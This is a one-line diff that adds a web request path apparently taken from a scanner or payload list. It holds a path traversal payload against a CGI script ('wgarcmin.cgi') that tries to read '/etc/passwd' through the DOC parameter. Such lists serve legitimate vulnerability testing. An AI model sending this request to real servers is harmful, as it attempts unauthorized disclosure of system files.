@@ -1,0 +1,1 @@
+/wgarcmin.cgi?NEXTPAGE=D&ID=1&DOC=../../../../etc/passwd
